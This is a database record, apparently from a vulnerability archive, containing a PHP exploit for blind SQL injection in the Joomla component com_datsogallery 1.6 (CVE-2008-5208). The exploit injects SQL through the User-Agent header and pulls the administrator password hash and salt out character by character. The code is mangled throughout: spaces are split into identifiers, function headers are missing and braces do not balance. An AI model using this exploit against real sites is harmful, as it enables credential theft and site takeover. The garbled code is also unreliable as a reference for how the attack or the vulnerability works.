{
    "text": "vul_name : Joomla Component com_datsogallery 1.6 Blind SQL Injection Exploit ， vul_cve : CVE-2008-5208 ， vul_poc : <? ， /Joomla Component com_datsogallery 1.6 Blind SQL Injection Exploit by +toxa+ ， /Greets : all members of antichat.ru & cih.ms ， /options ， set_time_limit ( 0 )  ;  ， ignore_user_abort ( 1 )  ;  ，  $ norm_ua='Mozilla/5.0 ( Windows ; U ; Windows NT 6.0 ; ru ; rv : 1.8.1.14 ) Gecko/20080404 Firefox/2.0.0.14' ;  ，  $ url= $ _GET [ 'url' ]  ;  ，  $ where= (  ! empty (  $ _GET [ 'user' ]  ) ?\"where username='\". $ _GET [ 'user' ] .\"'\" : 'limit 0 , 1' ;  ，  $ id= (  ! empty (  $ _GET [ 'id' ]  ) ? $ _GET [ 'id' ]  : '1' ;  ， /functions ， global $ id ;  ，  $ u=parse_url (  $ url )  ;  ，  $ req =\"GET \". $ u [ 'path' ] .\"components/com_datsogallery/sub_votepic.php?id= $ id&user_rating=1 HTTP/1.1\\r\\n\" ;  ，  $ req.=\"Host : \". $ u [ 'host' ] .\"\\r\\n\" ;  ，  $ req.=\"User-Agent : \". $ xpl.\"\\r\\n\" ;  ，  $ req.=\"Connection : Close\\r\\n\\r\\n\" ;  ，  $ fs=fsockopen (  $ u [ 'host' ]  , 80 ,  $ errno ,  $ errstr , 30 ) or die ( \"error :  $ errno - $ errstr<br>\\n\" )  ;  ， fwrite (  $ fs ,  $ req )  ;  ，  $ res=fread (  $ fs , 4096 )  ;  ， fclose (  $ fs )  ;  ， } ， global $ norm_ua ;  ， global $ where ;  ，  $ xpl=rand ( 1 , 100000 ) .\"' )  ,  ( 1 , if ( ascii ( substring ( select password from # _users $ where )  ,  $ pos , 1 )  $ condition ,  ( select ' $ norm_ua' )  ,  ( select link from # _menu ) / * \" ;  ， } ， /main ， echo '<title>Joomla Component com_datsogallery 1.6 Blind SQL Injection Exploit by +toxa+</title>' ;  ， send_xpl (  $ url ,  $ norm_ua )  ;  ， /get md5 ，  $ buff=send_xpl (  $ url , xpl ( '>58' ,  $ i )  ;  ， } ， } elseif ( preg_match ( '/Subquery returns more than 1 row/' ,  $ buff ) { ， } ， } else { ， die ( \"exploit failed\" )  ;  ， } ， } ， /check Joomla version ，  $ test=rand ( 1 , 100000 ) .\"' )  ,  ( 1 , if ( select length ( password ) from # _users $ where ) =32 ,  ( select ' $ norm_ua' )  ,  ( select link from # _menu ) / * \" ;  ，  $ buff=send_xpl (  $ url ,  $ test )  ;  ， /separator ，  $ pass.=' : ' ;  ， /get salt ，  $ buff=send_xpl (  $ url , xpl ( '>58' ,  $ i )  ;  ，  $ buff=send_xpl (  $ url , xpl ( '>91' ,  $ i )  ;  ， } ， } elseif ( preg_match ( '/Subquery returns more than 1 row/' ,  $ buff ) { ， } ， } else { ， die ( \"exploit failed\" )  ;  ， } ， } elseif ( preg_match ( '/Subquery returns more than 1 row/' ,  $ buff ) { ， } ， } else { ， die ( \"exploit failed\" )  ;  ， } ， } ， echo $ pass ; ",
    "time": "2008.11.25"
}